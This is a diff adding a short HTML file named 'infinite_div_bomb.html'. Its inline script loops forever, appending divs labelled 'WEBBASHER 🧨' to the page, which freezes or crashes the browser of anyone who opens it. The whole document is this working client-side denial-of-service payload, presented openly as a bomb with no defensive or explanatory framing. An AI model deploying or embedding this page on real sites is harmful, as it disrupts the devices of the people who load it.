@@ -1,0 +1,13 @@
+<!-- infinite_div_bomb.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      while (true) {
+        const div = document.createElement("div");
+        div.textContent = "WEBBASHER 🧨";
+        document.body.appendChild(div);
+      }
+    </script>
+  </body>
+</html>
